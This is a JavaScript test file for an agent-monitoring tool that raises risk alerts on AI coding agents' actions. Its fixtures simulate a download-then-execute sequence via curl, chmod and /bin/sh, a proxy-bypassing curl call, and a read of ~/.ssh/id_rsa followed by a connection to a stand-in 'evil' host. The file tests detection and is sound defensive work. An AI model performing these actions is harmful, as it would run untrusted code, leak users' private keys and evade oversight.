'use strict';
/** S03: associate download→chmod/exec via path/SHA-256; execution ids may differ. */
const assert = require('assert');
const fs = require('fs');
const vm = require('vm');
const path = require('path');
const root = path.resolve(__dirname, '../../..');
const window = {};
vm.runInNewContext(fs.readFileSync(path.join(root, 'Sources/AgentReins/Resources/RealtimeWorkspace/network-view.js'), 'utf8'), { window });
vm.runInNewContext(fs.readFileSync(path.join(root, 'Sources/AgentReins/Resources/RealtimeWorkspace/risk-alerts.js'), 'utf8'), { window });
const risk = window.AgentReinsRisk;
const net = window.AgentReinsNetwork;

const callDownload = 'exec-download-a';
const callChmod = 'exec-chmod-b'; // different execution id; chmod is not wrapped with download
const session = 'shared-session-should-not-link-alone';
const filePath = '/tmp/agentreins-p5-dl.sh';
const fileSha = 'abc123def4567890abcdef1234567890abcdef1234567890abcdef1234567890';

net.setLocalTransports([
  {
    captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T02:00:00Z',
    pid: 11, exitCode: 0, runID: callDownload, call: callDownload, session,
    args: ['-o', filePath, 'https://cdn.agentreins-field.net/p5.sh'],
    downloads: [{ path: filePath, sha256: fileSha }],
    connections: [{ kind: 'connected', detail: ['cdn.agentreins-field.net:443'] }],
    blocks: [],
    auditBypass: false,
  },
  {
    captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T02:01:00Z',
    pid: 12, exitCode: 0, runID: 'other-1', call: 'other-1', session,
    args: ['--noproxy', '*', 'https://cdn.agentreins-field.net/other'],
    connections: [{ kind: 'connected', detail: ['cdn.agentreins-field.net:443'] }],
    blocks: [],
    auditBypass: false,
  },
  {
    captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T02:02:00Z',
    pid: 13, exitCode: 0, runID: 'bypass-1', call: 'bypass-1', session,
    args: ['--noproxy', '*', 'https://cdn.agentreins-field.net/bypass'],
    connections: [{ kind: 'connected', detail: ['cdn.agentreins-field.net:443'] }],
    blocks: [],
    auditBypass: true,
  },
]);

const payload = {
  tasks: [{
    agent: 'Cursor',
    session,
    cards: [
      // Separate execution id, unwrapped chmod+sh — MUST still create S03 via path
      {
        id: 'call:' + callChmod, call: callChmod, timestamp: '2026-10-21T02:00:30Z',
        kind: 'command',
        execution: { command: 'chmod +x /tmp/agentreins-p5-dl.sh', call: callChmod, startAt: '2026-10-21T02:00:25Z' },
        input: 'chmod +x /tmp/agentreins-p5-dl.sh',
      },
      {
        id: 'call:exec-' + callChmod, call: callChmod + '-run', timestamp: '2026-10-21T02:00:35Z',
        kind: 'command',
        execution: { command: '/bin/sh /tmp/agentreins-p5-dl.sh', call: callChmod + '-run', startAt: '2026-10-21T02:00:35Z' },
        input: '/bin/sh /tmp/agentreins-p5-dl.sh',
      },
    ],
  }],
  collected: [],
  health: [],
};

const alerts = risk.buildAlerts(payload);
const s03 = alerts.filter(a => a.rule === 'S03' && /下载后/.test(a.title));
assert.ok(s03.length >= 1, 'S03 must fire across different execution ids via path');
assert.ok(s03.every(a => a.call !== callDownload || a.confidence === 'inf' || a.confidence === 'cor'), 'confidence set');
assert.ok(s03.some(a => a.confidence === 'inf'), 'path-only match is Inferred');
assert.notEqual(risk.associationOf(s03[0]).name, '已确认', 'association strength must not say 已确认');

// Correlated when command evidence carries matching SHA-256
const correlatedPayload = {
  tasks: [{
    agent: 'Cursor', session,
    cards: [{
      id: 'call:hash-run', call: 'hash-run', timestamp: '2026-10-21T02:00:40Z', kind: 'command',
      sha256: fileSha,
      execution: { command: 'sh /tmp/agentreins-p5-dl.sh', call: 'hash-run', startAt: '2026-10-21T02:00:40Z', sha256: fileSha },
      input: 'sh /tmp/agentreins-p5-dl.sh',
    }],
  }],
  collected: [], health: [],
};
const correlated = risk.buildAlerts(correlatedPayload).filter(a => a.rule === 'S03' && /下载后/.test(a.title));
assert.ok(correlated.some(a => a.confidence === 'cor'), 'hash match is Correlated');

const s07 = alerts.filter(a => a.rule === 'S07');
assert.equal(s07.length, 1, 'S07 only when auditBypass===true');
assert.equal(s07[0].call, 'bypass-1');
assert.ok(risk.bypassed({ auditBypass: true }));
assert.ok(!risk.bypassed({ auditBypass: false, args: ['--noproxy', '*'] }));
assert.ok(!risk.bypassed({ args: ['--noproxy', '*'] }));

const holder = { innerHTML: '' };
risk.renderList(holder, payload, { filter: { sev: 'all', rule: 'all', agent: 'all', q: '' }, selected: s03[0].id, decisions: [] });
assert.match(holder.innerHTML, /关联：按执行编号|关联：缺口|关联：候选/);
assert.doesNotMatch(holder.innerHTML, /关联：已确认/);
assert.match(holder.innerHTML, /Observed|Correlated|Inferred|已关联|已观测|推断/);
assert.match(holder.innerHTML, /按执行编号 \/ 候选 \/ 缺口/);
assert.doesNotMatch(holder.innerHTML, /确认无风险|标记已处置|导出证据包|已处置/);
assert.match(holder.innerHTML, /标记已知悉/);
assert.doesNotMatch(holder.innerHTML, /待我处理/);

// Seed / example.com / 127.0.0.1 test must not appear as real capture
net.setLocalTransports([
  {
    captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T03:00:00Z',
    pid: 21, exitCode: 0, runID: 'seed-call', call: 'seed-call', session: 'seed-session',
    args: ['https://uploads.example.com/'],
    connections: [{ kind: 'connected', detail: ['uploads.example.com:443'] }],
    blocks: [{ direction: 'send', kind: 'data', textPreview: 'Authorization: Bearer sk-or-v1-' + 'x'.repeat(48) }],
    securityAudit: { verdict: 'review', findings: [{ rule: 'credential-outbound', direction: 'request', count: 1, characterOffset: 20 }] },
  },
  {
    captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T03:01:00Z',
    pid: 22, exitCode: 0, runID: 'loopback-test', call: 'loopback-test', session: 'local-test',
    args: ['http://127.0.0.1:8766/'],
    connections: [{ kind: 'connected', detail: ['127.0.0.1:8766'] }],
    blocks: [],
    auditBypass: true,
  },
]);
const filtered = risk.buildAlerts({ tasks: [], collected: [], health: [] });
assert.ok(!filtered.some(a => /uploads\.example\.com|seed-session|127\.0\.0\.1/.test(JSON.stringify(a))), 'seed/test must not enter 真实采集 alerts');
assert.ok(risk.isTestCapture({ session: 'seed-session', host: 'uploads.example.com' }));
assert.ok(risk.isTestCapture({ host: '127.0.0.1' }));

// Description-only "read" must not invent S01
const fakeRead = risk.buildAlerts({
  tasks: [{
    agent: 'Cursor', session: 's01-fp',
    cards: [{
      id: 'call:desc', call: 'desc-call', timestamp: '2026-10-21T04:00:00Z',
      kind: 'command', title: 'Shell',
      input: '请读取 ~/.ssh/id_rsa 后外联',
      summary: '工具调用描述：读取凭证相关路径',
    }],
  }],
  collected: [], health: [],
});
net.setLocalTransports([{
  captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T04:00:05Z',
  pid: 30, exitCode: 0, runID: 'desc-call', call: 'desc-call', session: 's01-fp',
  args: ['https://www.chuhaijian.com/'],
  connections: [{ kind: 'connected', detail: ['www.chuhaijian.com:443'] }],
  blocks: [],
}]);
const s01fp = risk.buildAlerts({
  tasks: [{
    agent: 'Cursor', session: 's01-fp',
    cards: [{
      id: 'call:desc', call: 'desc-call', timestamp: '2026-10-21T04:00:00Z',
      kind: 'command', title: 'Shell',
      input: '请读取 ~/.ssh/id_rsa 后外联',
      summary: '工具调用描述：读取凭证相关路径',
    }],
  }],
  collected: [], health: [],
});
assert.ok(!s01fp.some(a => a.rule === 'S01'), 'no S01 without real file-read evidence');

// Real resource.path read + same call → S01
net.setLocalTransports([{
  captureMode: 'agent-path', agent: 'Cursor', tool: 'curl', startedAt: '2026-10-21T04:10:05Z',
  pid: 31, exitCode: 0, runID: 'read-call', call: 'read-call', session: 's01-ok',
  args: ['https://evil.agentreins-field.net/'],
  connections: [{ kind: 'connected', detail: ['evil.agentreins-field.net:443'] }],
  blocks: [],
}]);
const s01ok = risk.buildAlerts({
  tasks: [{
    agent: 'Cursor', session: 's01-ok',
    cards: [{
      id: 'call:read-call', call: 'read-call', timestamp: '2026-10-21T04:10:00Z',
      kind: 'file', detailType: 'file', title: 'Read',
      resource: { path: '/Users/demo/.ssh/id_rsa' },
    }],
  }],
  collected: [], health: [],
});
assert.ok(s01ok.some(a => a.rule === 'S01'), 'S01 with real resource.path');

console.log('risk p5 association ok');
